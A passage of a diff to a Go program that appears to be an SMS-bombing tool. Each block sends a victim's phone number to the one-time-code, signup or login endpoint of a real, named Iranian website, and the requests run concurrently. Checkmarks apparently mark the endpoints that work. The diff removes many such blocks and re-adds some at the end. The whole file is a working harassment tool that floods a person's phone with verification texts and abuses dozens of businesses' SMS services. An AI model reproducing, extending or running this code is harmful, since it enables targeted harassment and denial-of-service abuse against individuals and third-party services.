@@ -519,15 +519,7 @@ cookieJar, _ := cookiejar.New(nil)
 		sendJSONRequest(c, ctx, "https://services.fitamin.ir/fitamin-central-service/api/fitamin/send-verification-code", payload, &wg, ch)
          	}
               }(client)
-                //operator-100.ir
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("email", phone)
-				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
-			}
-		}(client)
+
                 //gama.ir ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -538,43 +530,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://gama.ir/api/v1/users/login", formData, &wg, ch)
 			}
 		}(client)
-                // naabshop.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("login_digt_countrycode", "+98")
-				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
-				formData.Set("action_type", "phone")
-				formData.Set("digits_reg_name", "testname") 
-				formData.Set("digits_reg_lastname", "testlastname") 
-				formData.Set("digits_process_register", "1")
-				formData.Set("sms_otp", "")
-				formData.Set("otp_step_1", "1")
-				formData.Set("signup_otp_mode", "1")
-				formData.Set("rememberme", "1")
-				formData.Set("digits", "1")
-				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
-				formData.Set("action", "digits_forms_ajax")
-				formData.Set("type", "login")
-				formData.Set("digits_step_1_type", "")
-				formData.Set("digits_step_1_value", "")
-				formData.Set("digits_step_2_type", "")
-				formData.Set("digits_step_2_value", "")
-				formData.Set("digits_step_3_type", "")
-				formData.Set("digits_step_3_value", "")
-				formData.Set("digits_login_email_token", "")
-				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
-				formData.Set("digits_form", "28e10ee7bd")
-				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
-				formData.Set("show_force_title", "1")
-				formData.Set("container", "digits_protected")
-				formData.Set("sub_action", "sms_otp")
-
-				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-		}(client)
-
+              
 		//karnameh.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -600,18 +556,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://client.afrak.com/api/v1/pre-register", payload, &wg, ch)
 			}
 		}(client)
-		//masterkala.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
-				payload := map[string]interface{}{
-					"type": "sendotp",
-					"phone": phone,
-				}
-				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
-			}
-		}(client)
+
 		//iranous.com ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -630,21 +575,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, serviceURL, formData, &wg, ch)
 			}
 		}(client)
-		// oldpanel.avalpardakht.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"mobile":            phone, 
-					"email":             "randomuser@example.com", 
-					"password":          "SecurePass123!", 
-					"rules":             true,
-					"is_business":       0,
-					"online_chat_token": "", 
-				}
-				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
-			}
-		}(client)
+
 		// digido.ir ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -673,27 +604,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://api.nikpardakht.com/api/v1/register", payload, &wg, ch)
 			}
 		}(client)
-		//takdoo.com
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "ehraz_sms_otp_phone_verify")
-				formData.Set("phone_number", phone) 
-				formData.Set("login_method", "code")
-				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-		}(client)
-		// irangan.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("mobile", phone) 
-				formData.Set("email", "")   
-				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
-			}
-		}(client)
+
 		//irancoral.ir  ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -751,21 +662,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("r", "%2F")
 				formData.Set("phone", getPhoneNumberNoZero(phone)) 
 				sendFormRequest(c, ctx, "https://hoseinifinance.com/?amzshyar_account_ajax=true", formData, &wg, ch)
-			}
-		}(client)
-
-		//  toprayan.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("Step", "EnterMobile")
-				formData.Set("Mobile", phone)
-				formData.Set("Password", "")    
-				formData.Set("RememberMe", "false")
-				formData.Set("VerifyCode", "")
-				formData.Set("X-Requested-With", "XMLHttpRequest")
-				sendFormRequest(c, ctx, "https://toprayan.com/account/login", formData, &wg, ch)
 			}
 		}(client)
 
@@ -868,20 +764,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-	        //(Tapsi) - POST JSON
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"credential": map[string]interface{}{
-						"phoneNumber": phone, 
-						"role":        "PASSENGER",
-					},
-				}
-				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
-			}
-		}(client)
-
 		// (Torob) - GET ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -944,28 +826,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
 			}
 		}(client)
-		// vitrin.shop
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"phone_number": phone, 
-					"forgot_password": false, 
-				}
-				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
-			}
-		}(client)
-		// titomarket.com
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") 
-				formData.Set("emailsend", "0") 
-				formData.Set("telephone", phone) 
-				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
-			}
-		}(client) 
 
 		// dolichi.com (Login/Register - POST Form) ✅ 
 		wg.Add(1)
@@ -984,26 +844,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://www.dolichi.com/login?back=my-account", formData, &wg, ch)
 			}
 		}(client)
-		// pirankalaco.ir (OTP - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("phone", phone) 
-				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
-			}
-		}(client)
-		// narsisbeauty.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("phone_number", phone) 
-				formData.Set("wupp_remember_me", "on") 
-				formData.Set("action", "wupp_sign_up") 
-				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-			}
-		}(client)
+
 		// davidjonesonline.ir (Login/OTP - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -1014,21 +855,7 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://davidjonesonline.ir/api/v1/sessions/login_request", payload, &wg, ch)
 			}
 		}(client)
-		// api.123kif.com Register (Registration/OTP - POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				payload := map[string]interface{}{
-					"mobile": phone, 
-					"password": "testpassword123", 
-					"firstName": "Test", 
-					"lastName": "User", 
-					"platform": "web", 
-					"refferCode": "", 
-				}
-				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
-			}
-		}(client)
+
 		// bimebazar.com login_sec (OTP - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -1040,23 +867,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://bimebazar.com/accounts/api/login_sec/", payload, &wg, ch)
 			}
 		}(client)
-
-		// microele.com (Registration - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("id_customer", "")
-				formData.Set("back", ",my-account")
-				formData.Set("firstname", "123")
-				formData.Set("lastname", "123")
-				formData.Set("password", "123456")
-				formData.Set("action", "register")
-				formData.Set("username", phone)
-				formData.Set("ajax", "1")
-				sendFormRequest(c, ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch) // ارسال c
-			}
-		}(client) 
 
 		// telketab.com (POST Form) ✅ 
 		wg.Add(1)
@@ -1071,29 +881,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// techsiro.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("client", "web")
-				formData.Set("method", "POST")
-				formData.Set("_token", "")
-				formData.Set("mobile", phone)
-				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// shimashoes.com (Registration - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("email", phone)
-				sendFormRequest(c, ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // ارسال c
-			}
-		}(client) 
-
 		// eaccount.ir (SMS - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1105,16 +892,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// queenaccessories.ir (SMS - POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				payload := map[string]interface{}{
-					"mobile_phone": phone,
-				}
-				sendJSONRequest(c, ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
-			}
-		}(client) 
 		// vinaaccessory.com (SMS - POST JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1134,84 +911,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formattedPhone := "0098" + getPhoneNumberNoZero(phone)
 				formData.Set("mobile", formattedPhone)
 				sendFormRequest(c, ctx, "https://dastaneman.com/User/SendCode", formData, &wg, ch) // ارسال c
-			}
-		}(client)
-
-		// gitamehr.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "mreeir_send_sms")
-				formData.Set("mobileemail", phone)
-				formData.Set("userisnotauser", "")
-				formData.Set("type", "mobile")
-				formData.Set("captcha", "")
-				formData.Set("captchahash", "")
-				formData.Set("security", "75d313bc3e")
-				sendFormRequest(c, ctx, "https://gitamehr.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// 4hair.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "mreeir_send_sms")
-				formData.Set("mobileemail", phone)
-				formData.Set("userisnotauser", "")
-				formData.Set("type", "mobile")
-				formData.Set("captcha", "")
-				formData.Set("captchahash", "")
-				formData.Set("security", "52771e6d1a")
-				sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// account724.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "stm_login_register")
-				formData.Set("type", "mobile")
-				formData.Set("input", phone)
-				sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// api-atlasmode.alochand.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("version", "new2")
-				formData.Set("mobile", phone)
-				formData.Set("sdlkjcvisl", "uikjdknfs")
-				sendFormRequest(c, ctx, "https://api-atlasmode.alochand.com/v1/customer/register-login?version=new2", formData, &wg, ch) // ارسال c
-			}
-		}(client)
-		// api.pashikshoes.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("mobile", phone)
-				formData.Set("sdlkjcvisl", "uikjdknfs")
-				sendFormRequest(c, ctx, "https://api.pashikshoes.com/v1/customer/register-login", formData, &wg, ch) 
-			}
-		}(client)
-
-		// api.paaakar.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("version", "new1")
-				formData.Set("mobile", phone)
-				formData.Set("sdlkjcvisl", "uikjdknfs")
-				sendFormRequest(c, ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
 			}
 		}(client)
 
@@ -1238,18 +937,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// zzzagros.com (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "awsa-login-with-phone-send-code")
-				formData.Set("nonce", "9a4e9547c3")
-				formData.Set("username", phone)
-				sendFormRequest(c, ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
 		// janebi.com (SMS - POST Form) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1261,28 +948,6 @@ cookieJar, _ := cookiejar.New(nil)
 				formData.Set("popup", "1")
 				formData.Set("signin", "1")
 				sendFormRequest(c, ctx, "https://janebi.com/signin", formData, &wg, ch) 
-			}
-		}(client)
-
-		// ubike.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "logini_first")
-				formData.Set("login", phone)
-				sendFormRequest(c, ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// www.kanoonbook.ir (SMS - POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("task", "customer_phone")
-				formData.Set("customer_username", phone)
-				sendFormRequest(c, ctx, "https://www.kanoonbook.ir/store/customer_otp", formData, &wg, ch) 
 			}
 		}(client)
 
@@ -1329,18 +994,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "refah_send_code")
-				formData.Set("mobile", phone)
-				formData.Set("security", "placeholder")
-
-				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
 		// https://www.drsaina.com/ (GET) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1359,16 +1012,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// https://pirankalaco.ir/SendPhone.php (Form Data)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("phone", phone)
-				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch) 
-			}
-		}(client) 
-
 		// https://gharar.ir/users/phone_number/ (Form Data) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1378,16 +1021,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch) 
 			}
 		}(client)
-
-		// https://www.irantic.com/api/login/authenticate (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) 
 
 		// gifkart.com (SMS - POST Form) ✅ 
 		wg.Add(1)
@@ -1432,47 +1065,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch) 
 			}
 		}(client)
-
-		// pgemshop.com (POST Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "digits_check_mob")
-				formData.Set("countrycode", "+98")
-				formData.Set("mobileNo", phone)
-				formData.Set("csrf", "0a60a620d9")
-				formData.Set("login", "2")
-				formData.Set("username", "")
-				formData.Set("email", "")
-				formData.Set("captcha", "")
-				formData.Set("captcha_ses", "")
-				formData.Set("json", "1")
-				formData.Set("whatsapp", "0")
-				sendFormRequest(c, ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
-		// api.cafebazaar.ir (POST JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				payload := map[string]interface{}{
-					"properties": map[string]interface{}{
-						"language":      2,
-						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
-						"clientVersion": "web",
-						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
-					},
-					"singleRequest": map[string]interface{}{
-						"getOtpTokenRequest": map[string]interface{}{
-							"username": getPhoneNumber98NoZero(phone),
-						},
-					},
-				}
-				sendJSONRequest(c, ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch) 
-			}
-		}(client) 
 
 		// harikashop.com ✅ 
 		wg.Add(1)
@@ -1566,38 +1158,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client)
 
-		// bigtoys.ir - Variation 3 (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action_type", "phone")
-				formData.Set("digt_countrycode", "+98")
-				formData.Set("phone", strings.TrimPrefix(phone, "0"))
-				formData.Set("email", "")
-				formData.Set("digits_reg_name", "abcdefghl")
-				formData.Set("digits_reg_password", "qzF8w7UAZusAJdg")
-				formData.Set("digits_process_register", "1")
-				formData.Set("optional_email", "")
-				formData.Set("is_digits_optional_data", "1")
-				formData.Set("sms_otp", "")
-				formData.Set("otp_step_1", "1")
-				formData.Set("signup_otp_mode", "1")
-				formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
-				formData.Set("optional_data", "email")
-				formData.Set("action", "digits_forms_ajax")
-				formData.Set("type", "register")
-				formData.Set("dig_otp", "")
-				formData.Set("digits", "1")
-				formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
-				formData.Set("digits_form", "3bed3c0f10")
-				formData.Set("_wp_http_referer", "/")
-				formData.Set("container", "digits_protected")
-				formData.Set("sub_action", "sms_otp")
-				sendFormRequest(c, ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
-			}
-		}(client) 
-
 		// mamifood.org - SendValidationCode (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -1605,16 +1165,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendJSONRequest(c, ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{ 
 					"Phone": phone,
 					"did":   "ecdb7f59-9aee-41f5-b0b1-65cde6bf1791",
-				}, &wg, ch)
-			}
-		}(client) 
-
-		// platform-api.snapptrip.com 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
-					"phoneNumber": phone,
 				}, &wg, ch)
 			}
 		}(client) 
@@ -1632,38 +1182,6 @@ cookieJar, _ := cookiejar.New(nil)
 					"IsAppOnly":                false,
 					"deviceTypeCode":           7,
 				}, &wg, ch)
-			}
-		}(client) 
-
-		// see5.net (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("mobile", phone)
-				formData.Set("name", "sfsfsfsffsf")
-				formData.Set("demo", "bz_sh_fzltprxh")
-				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
-			}
-		}(client) 
-
-		// itmall.ir (Form)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				formData := url.Values{}
-				formData.Set("action", "digits_check_mob")
-				formData.Set("countrycode", "+98")
-				formData.Set("mobileNo", phone)
-				formData.Set("csrf", "e57d035242")
-				formData.Set("login", "2")
-				formData.Set("username", "")
-				formData.Set("email", "")
-				formData.Set("captcha", "")
-				formData.Set("captcha_ses", "")
-				formData.Set("json", "1")
-				formData.Set("whatsapp", "0")
-				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
 			}
 		}(client) 
 
@@ -1688,37 +1206,6 @@ cookieJar, _ := cookiejar.New(nil)
 				sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch) 
 			}
 		}(client) 
-
-		// virgool.io (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-					"method":     "phone",
-					"identifier": phone,
-				}, &wg, ch)
-			}
-		}(client) 
-
-		// virgool.io (JSON) 
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{ 
-					"username": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
-		// virgool.io (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{ 
-					"identifier": phone,
-				}, &wg, ch)
-			}
-		}(client)
 
 		// sandbox.sibbazar.com (JSON) ✅ 
 		wg.Add(1)
@@ -1781,23 +1268,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// Mobinnet (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch) 
-			}
-		}(client)
-
-		// api.ostadkr.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client) 
 // har dota active hastand
 		// digikalajet.ir (JSON) ✅ 
 		wg.Add(1)
@@ -1819,15 +1289,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// iranicard.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client)
 // az in 2 ta yekish kar mikoneh fekr konam.
 		// alopeyk.com (JSON)  ✅ 
 		wg.Add(1)
@@ -1919,26 +1380,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// miare.ir (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{ 
-					"phone_number": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
-		// pezeshket.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
-					"mobileNumber": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
 		// classino.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() {
@@ -2006,16 +1447,6 @@ cookieJar, _ := cookiejar.New(nil)
 			return func() {
 				sendJSONRequest(c, ctx, "https://api.ponisha.ir/api/v1/auth/register", map[string]interface{}{
 					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
-		// bitycle.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() { 
-			return func() {
-				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
-					"phone": phone,
 				}, &wg, ch)
 			}
 		}(client)
@@ -2092,16 +1523,6 @@ cookieJar, _ := cookiejar.New(nil)
 			}
 		}(client) 
 
-		// caropex.com (JSON)
-		wg.Add(1)
-		tasks <- func(c *http.Client) func() {
-			return func() {
-				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
-					"mobile": phone,
-				}, &wg, ch)
-			}
-		}(client)
-
 		// tetherland.com (JSON) ✅ 
 		wg.Add(1)
 		tasks <- func(c *http.Client) func() { 
@@ -2121,6 +1542,632 @@ cookieJar, _ := cookiejar.New(nil)
 				}, &wg, ch)
 			}
 		}(client)
+
+		// pirankalaco.ir (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("phone", phone) 
+				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
+			}
+		}(client)
+		// narsisbeauty.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("phone_number", phone) 
+				formData.Set("wupp_remember_me", "on") 
+				formData.Set("action", "wupp_sign_up") 
+				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// vitrin.shop
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": phone, 
+					"forgot_password": false, 
+				}
+				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
+			}
+		}(client)
+		// titomarket.com
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") 
+				formData.Set("emailsend", "0") 
+				formData.Set("telephone", phone) 
+				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
+			}
+		}(client) 
+
+	        //(Tapsi) - POST JSON
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"credential": map[string]interface{}{
+						"phoneNumber": phone, 
+						"role":        "PASSENGER",
+					},
+				}
+				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
+			}
+		}(client)
+		//  toprayan.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("Step", "EnterMobile")
+				formData.Set("Mobile", phone)
+				formData.Set("Password", "")    
+				formData.Set("RememberMe", "false")
+				formData.Set("VerifyCode", "")
+				formData.Set("X-Requested-With", "XMLHttpRequest")
+				sendFormRequest(c, ctx, "https://toprayan.com/account/login", formData, &wg, ch)
+			}
+		}(client)
+		//takdoo.com
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "ehraz_sms_otp_phone_verify")
+				formData.Set("phone_number", phone) 
+				formData.Set("login_method", "code")
+				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+		// irangan.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("mobile", phone) 
+				formData.Set("email", "")   
+				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
+			}
+		}(client)
+		// oldpanel.avalpardakht.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile":            phone, 
+					"email":             "randomuser@example.com", 
+					"password":          "SecurePass123!", 
+					"rules":             true,
+					"is_business":       0,
+					"online_chat_token": "", 
+				}
+				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
+			}
